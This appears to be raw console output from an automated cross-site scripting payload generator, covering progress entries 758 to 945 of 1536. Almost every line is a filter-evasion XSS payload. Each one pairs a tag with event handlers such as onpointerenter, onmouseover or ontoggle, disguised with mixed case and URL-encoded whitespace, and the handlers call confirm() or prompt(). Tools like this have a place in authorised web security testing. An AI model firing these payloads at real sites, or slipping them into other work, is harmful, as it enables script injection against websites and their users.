 Efficiency: 91 
 Confidence: 10 
 Progress: 758/1536 ------------------------------------------------------------
 Payload: <A%0donpOINterenTeR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 759/1536 ------------------------------------------------------------
 Payload: <A/+/ONPoIntEReNter+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 760/1536 ------------------------------------------------------------
 Payload: <A%09oNmoUsEOVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 761/1536 ------------------------------------------------------------
 Payload: <DEtaiLS%0aonPOinterentER%0a=%0aa=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 762/1536 ------------------------------------------------------------
 Payload: <D3V/+/onPOInTErentEr+=+[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 763/1536 ------------------------------------------------------------
 Payload: <a%0aONpOiNTerEntEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 764/1536 ------------------------------------------------------------
 Payload: <a%0dONPointErenTEr%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 765/1536 ------------------------------------------------------------
 Payload: <DETAIls/+/ONtOgglE%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 766/1536 ------------------------------------------------------------
 Payload: <d3V%09ONMoUsEOVer%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 767/1536 ------------------------------------------------------------
 Payload: <a%0doNPOINTErENteR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 768/1536 ------------------------------------------------------------
 Payload: <a%0dOnmoUSeOVER%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 769/1536  Progress: 770/1536 ------------------------------------------------------------
 Payload: <d3v%0aoNMOUSEOvEr%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 771/1536 ------------------------------------------------------------
 Payload: <htMl%09onpOIntEREntER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 772/1536 ------------------------------------------------------------
 Payload: <hTML/+/onPointeREntEr%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 773/1536 ------------------------------------------------------------
 Payload: <d3V%0doNmOusEOVER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 774/1536 ------------------------------------------------------------
 Payload: <html/+/OnPOIntERenteR+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 775/1536 ------------------------------------------------------------
 Payload: <d3v%0doNMOuSEOVer%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 776/1536 ------------------------------------------------------------
 Payload: <D3V/+/oNPoINTeREnteR%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 777/1536 ------------------------------------------------------------
 Payload: <detAiLS%0aONtOgGlE%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 778/1536 ------------------------------------------------------------
 Payload: <d3v%0aonMOUSeoVer%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 779/1536 ------------------------------------------------------------
 Payload: <a%0dOnmouSEOvEr%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 780/1536 ------------------------------------------------------------
 Payload: <DetailS%0aoNtOGGle%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 781/1536 ------------------------------------------------------------
 Payload: <hTml%0dOnpointErEnteR%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 782/1536 ------------------------------------------------------------
 Payload: <D3V%0dONpOInTerENtER%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 783/1536  Progress: 784/1536 ------------------------------------------------------------
 Payload: <D3V%09OnpOiNterENtER%09=%09(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 785/1536 ------------------------------------------------------------
 Payload: <hTmL%0dOnMOusEOvER%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 786/1536 ------------------------------------------------------------
 Payload: <d3v%09ONMoUSeoveR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 787/1536 ------------------------------------------------------------
 Payload: <Html/+/oNmouseOVeR%0a=%0a(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 788/1536 ------------------------------------------------------------
 Payload: <hTmL/+/OnMoUSEOvER%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 789/1536 ------------------------------------------------------------
 Payload: <A%0dONMOuSeOVER%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 790/1536  Progress: 791/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnmOUSEovEr+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 792/1536 ------------------------------------------------------------
 Payload: <D3v%09oNMOuSEOveR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 793/1536 ------------------------------------------------------------
 Payload: <htMl%0donpoINtERENter%0d=%0d[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 794/1536 ------------------------------------------------------------
 Payload: <HTml%09onmOuSEovEr%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 795/1536 ------------------------------------------------------------
 Payload: <htmL%09OnPOIntERenTER%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 796/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnmOusEOVeR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 797/1536 ------------------------------------------------------------
 Payload: <htML/+/ONmousEoVEr+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 798/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNMouSEOver%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 799/1536 ------------------------------------------------------------
 Payload: <DEtAiLs%0aONtOGGLe%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 800/1536  Progress: 801/1536 ------------------------------------------------------------
 Payload: <d3V%09onPOiNTerEnTeR+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 802/1536 ------------------------------------------------------------
 Payload: <HTMl%0dOnMOUsEoVEr%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 803/1536 ------------------------------------------------------------
 Payload: <HtML%0aonmoUSeoVEr%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 804/1536 ------------------------------------------------------------
 Payload: <A%0dOnMOuSEOver%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 805/1536 ------------------------------------------------------------
 Payload: <DETaIlS%09onPOINTerEnTER%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 806/1536 ------------------------------------------------------------
 Payload: <DeTaILs%0dONTOggLE%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 807/1536 ------------------------------------------------------------
 Payload: <HtMl/+/OnmoUSEovER+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 808/1536 ------------------------------------------------------------
 Payload: <htmL%0dONPoinTereNtEr%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 809/1536 ------------------------------------------------------------
 Payload: <detAIls/+/OnTogGle+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 810/1536 ------------------------------------------------------------
 Payload: <hTML/+/oNPoInTErentER%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 811/1536 ------------------------------------------------------------
 Payload: <A%0dOnMOUSeoVER%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 812/1536 ------------------------------------------------------------
 Payload: <DetaILS/+/onpOIntEReNTeR+=+[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 813/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNPOINTErENTEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 814/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNmouseover%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 815/1536 ------------------------------------------------------------
 Payload: <D3V%09OnmOUSeoVER%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 816/1536 ------------------------------------------------------------
 Payload: <DeTaILS%0aoNpOINterEnTeR%0a=%0a(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 817/1536 ------------------------------------------------------------
 Payload: <a%0aONMouSeoVeR%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 818/1536 ------------------------------------------------------------
 Payload: <A%09ONPoiNtErEnTER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 819/1536 ------------------------------------------------------------
 Payload: <d3v%09onpOINtErENTer+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 820/1536 ------------------------------------------------------------
 Payload: <d3V%09onpOInTereNTer%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 821/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnpoInTERenTeR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 822/1536 ------------------------------------------------------------
 Payload: <A%0aoNPoINTerENTer+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 823/1536 ------------------------------------------------------------
 Payload: <HTMl%09ONPOInTErENtEr%0d=%0da=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 824/1536 ------------------------------------------------------------
 Payload: <a%09OnMouseovER+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 825/1536  Progress: 826/1536 ------------------------------------------------------------
 Payload: <HtML%09onMouSeOvER%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 827/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnmoUseOvEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 828/1536  Progress: 829/1536 ------------------------------------------------------------
 Payload: <a/+/oNmOUsEoVEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 830/1536 ------------------------------------------------------------
 Payload: <A%0aonmouSeoVEr%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 831/1536 ------------------------------------------------------------
 Payload: <D3v%09onPointErENTer%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 832/1536 ------------------------------------------------------------
 Payload: <D3v%09oNPoInTEReNTer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 833/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnPOiNTeReNtEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 834/1536 ------------------------------------------------------------
 Payload: <a%09OnpoiNterENteR%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 835/1536 ------------------------------------------------------------
 Payload: <HTmL%0dONpoINtERENteR+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 836/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnmOuSEOvEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 837/1536 ------------------------------------------------------------
 Payload: <Html/+/oNMoUSEoVeR%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 838/1536 ------------------------------------------------------------
 Payload: <A%09onpointErEnTER%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 839/1536 ------------------------------------------------------------
 Payload: <HTMl%0dONPOINtErENTER+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 840/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnPOinteRENtER+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 841/1536 ------------------------------------------------------------
 Payload: <A%0aonPOInTERENter+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 842/1536 ------------------------------------------------------------
 Payload: <hTML%09onmOuSeOvEr%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 843/1536 ------------------------------------------------------------
 Payload: <deTAILs%0aONpoINTErENTEr%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 844/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnmouSEOveR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 845/1536 ------------------------------------------------------------
 Payload: <A%09ONMOuSeOVer%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 846/1536 ------------------------------------------------------------
 Payload: <HtML/+/onPOINteREnter%09=%09[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 847/1536 ------------------------------------------------------------
 Payload: <d3v%0dONpOINTeReNtER+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 848/1536 ------------------------------------------------------------
 Payload: <detAILS%0aOnToGgle%09=%09[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 849/1536 ------------------------------------------------------------
 Payload: <A%0donmousEOvEr%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 850/1536 ------------------------------------------------------------
 Payload: <DeTAils/+/ONpoInTEReNtEr%0d=%0da=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 851/1536 ------------------------------------------------------------
 Payload: <hTML/+/ONPOiNTEreNtEr%09=%09(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 852/1536 ------------------------------------------------------------
 Payload: <dEtailS/+/ONtoGglE+=+(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 853/1536  Progress: 854/1536 ------------------------------------------------------------
 Payload: <DetaIls/+/ONtOgGLE%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 855/1536 ------------------------------------------------------------
 Payload: <D3v/+/onPoInTEREnTER%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 856/1536 ------------------------------------------------------------
 Payload: <DetAiLs/+/OntOGglE%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 857/1536 ------------------------------------------------------------
 Payload: <D3V%0donMouSEoveR%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 858/1536 ------------------------------------------------------------
 Payload: <D3V%0doNPOiNTERentEr%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 859/1536 ------------------------------------------------------------
 Payload: <A%09OnMOusEOveR%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 860/1536  Progress: 861/1536 ------------------------------------------------------------
 Payload: <d3v%0aonpOiNterEntER%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 862/1536 ------------------------------------------------------------
 Payload: <D3V%09ONpoiNteREnter%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 863/1536 ------------------------------------------------------------
 Payload: <HTml%09oNPOINtErEnTeR+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 864/1536 ------------------------------------------------------------
 Payload: <htmL/+/oNPOIntEReNTer%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 865/1536  Progress: 866/1536 ------------------------------------------------------------
 Payload: <A%09ONPoinTeReNtER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 867/1536 ------------------------------------------------------------
 Payload: <D3v%09oNPointerEnTeR+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 868/1536  Progress: 869/1536 ------------------------------------------------------------
 Payload: <a/+/ONPoINTeReNTer%09=%09(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 870/1536 ------------------------------------------------------------
 Payload: <html%0aONpoinTEreNTeR%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 871/1536 ------------------------------------------------------------
 Payload: <deTAilS/+/OnPoiNtereNtEr%0d=%0d[8].find(confirm)// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 872/1536  Progress: 873/1536 ------------------------------------------------------------
 Payload: <D3V/+/ONPoIntEReNTEr+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 874/1536 ------------------------------------------------------------
 Payload: <D3v%0aoNpOInTeRENTeR%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 875/1536 ------------------------------------------------------------
 Payload: <DEtAiLS%09ONPoiNTereNTer%09=%09(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 876/1536 ------------------------------------------------------------
 Payload: <a%0dONmOUSEoVER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 877/1536 ------------------------------------------------------------
 Payload: <DEtaILs%0aONPOInteRENter%0d=%0d(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 878/1536 ------------------------------------------------------------
 Payload: <A%0aOnPOINterentEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 879/1536 ------------------------------------------------------------
 Payload: <d3v%09ONpOINTeREnTEr%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 880/1536 ------------------------------------------------------------
 Payload: <d3V%0aOnPoInteReNTEr%09=%09confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 881/1536 ------------------------------------------------------------
 Payload: <dETAilS%0dONPoINteREnTEr%0a=%0aconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 882/1536 ------------------------------------------------------------
 Payload: <detAIls%09onPoInTERENTeR%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 883/1536 ------------------------------------------------------------
 Payload: <d3v%09OnmOUsEOVeR+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 884/1536 ------------------------------------------------------------
 Payload: <dETAIls%09oNtOGGle+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 885/1536 ------------------------------------------------------------
 Payload: <d3V/+/oNPoiNterEnTer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 886/1536 ------------------------------------------------------------
 Payload: <D3V%0dONmousEOVeR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 887/1536 ------------------------------------------------------------
 Payload: <a%09oNmOUSeOVEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 888/1536 ------------------------------------------------------------
 Payload: <HTmL/+/onpOIntEreNtEr%0a=%0a(confirm)()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 889/1536 ------------------------------------------------------------
 Payload: <D3V%0dONmousEoVeR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 890/1536 ------------------------------------------------------------
 Payload: <htML%0dOnpoInteRenTER%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 891/1536 ------------------------------------------------------------
 Payload: <d3v%09ONmOuSeOveR%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 892/1536 ------------------------------------------------------------
 Payload: <DEtAILs/+/oNtOggle%0a=%0a(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 893/1536 ------------------------------------------------------------
 Payload: <d3v%09onmOUsEOVer%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 894/1536  Progress: 895/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNPOInTerenTeR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 896/1536 ------------------------------------------------------------
 Payload: <hTml/+/oNmouSeover%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 897/1536 ------------------------------------------------------------
 Payload: <deTAiLS%09OnTOGGLE+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 898/1536 ------------------------------------------------------------
 Payload: <DetAILs/+/OnpoiNtERentER%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 899/1536 ------------------------------------------------------------
 Payload: <D3v%0aonpoInterEntER%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 900/1536 ------------------------------------------------------------
 Payload: <DeTAils/+/ONPOinTEREntEr%09=%09[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 901/1536  Progress: 902/1536 ------------------------------------------------------------
 Payload: <A%0doNMouseoveR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 903/1536 ------------------------------------------------------------
 Payload: <D3v%0aONmOuseOVER%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 904/1536 ------------------------------------------------------------
 Payload: <d3V%0aonMoUSEOVER%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 905/1536 ------------------------------------------------------------
 Payload: <htmL%0doNpoINtEReNteR%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 906/1536 ------------------------------------------------------------
 Payload: <a/+/onpOInteReNTeR%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 907/1536 ------------------------------------------------------------
 Payload: <d3v%09OnMouseoVEr%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 908/1536 ------------------------------------------------------------
 Payload: <D3V%0dONpoiNTErEntER%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 909/1536 ------------------------------------------------------------
 Payload: <D3V/+/ONMOuSeoVEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 910/1536 ------------------------------------------------------------
 Payload: <d3V%09onmOuseOveR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 911/1536 ------------------------------------------------------------
 Payload: <A%09onmOUSeOVeR%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 912/1536 ------------------------------------------------------------
 Payload: <d3v/+/ONmOuSEOVeR+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 913/1536 ------------------------------------------------------------
 Payload: <d3v%09ONMousEOvER%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 914/1536 ------------------------------------------------------------
 Payload: <D3V/+/onPoiNTErEnTer%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 915/1536 ------------------------------------------------------------
 Payload: <d3V%0dOnmOUSEoVer%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 916/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNPOintErenTeR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 917/1536 ------------------------------------------------------------
 Payload: <D3V%0aonPOinterENTeR%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 918/1536 ------------------------------------------------------------
 Payload: <D3V%0doNmousEOvER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 919/1536  Progress: 920/1536 ------------------------------------------------------------
 Payload: <a/+/oNPoinTeRenTeR+=+confirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 921/1536 ------------------------------------------------------------
 Payload: <D3V%09onpOinterentEr%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 922/1536 ------------------------------------------------------------
 Payload: <DEtAiLs%09OnPOinTErENTEr%0d=%0da=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 923/1536 ------------------------------------------------------------
 Payload: <htmL%09onMouseOVEr+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 924/1536 ------------------------------------------------------------
 Payload: <DeTAils/+/ONTOGGlE%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 925/1536 ------------------------------------------------------------
 Payload: <HtmL%09OnPointeRENter+=+(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 926/1536 ------------------------------------------------------------
 Payload: <HTml%0aonpoINTereNteR%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 927/1536 ------------------------------------------------------------
 Payload: <hTMl%0aoNMouSeoVER%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 928/1536  Progress: 929/1536 ------------------------------------------------------------
 Payload: <a%09onmOuSEOver%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 930/1536 ------------------------------------------------------------
 Payload: <d3V%0aONMoUsEOvEr+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 931/1536 ------------------------------------------------------------
 Payload: <a%0aONmoUSeOver%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 932/1536 ------------------------------------------------------------
 Payload: <detAIlS%09onTOgGLe%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 933/1536 ------------------------------------------------------------
 Payload: <A%09ONpointeRENTer+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 934/1536 ------------------------------------------------------------
 Payload: <htmL%09OnpoINTerEnteR+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 935/1536 ------------------------------------------------------------
 Payload: <DeTaiLS%0aoNpOiNTEReNTer%0a=%0a(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 936/1536 ------------------------------------------------------------
 Payload: <d3V/+/ONpOInTerenTEr%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 937/1536 ------------------------------------------------------------
 Payload: <a%09OnMOusEOVeR%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 938/1536 ------------------------------------------------------------
 Payload: <a%0aOnPOiNTErEnTeR%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 939/1536 ------------------------------------------------------------
 Payload: <a/+/onpOintEREnTeR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 940/1536 ------------------------------------------------------------
 Payload: <HTmL%0aonmouSEOVER+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 941/1536 ------------------------------------------------------------
 Payload: <a%09onmouSEOVer+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 942/1536 ------------------------------------------------------------
 Payload: <htMl%0aoNmoUsEovEr+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 943/1536 ------------------------------------------------------------
 Payload: <D3v/+/oNmOuSeoVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 944/1536 ------------------------------------------------------------
 Payload: <HTMl%0dONmoUSeOver+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 945/1536 ------------------------------------------------------------
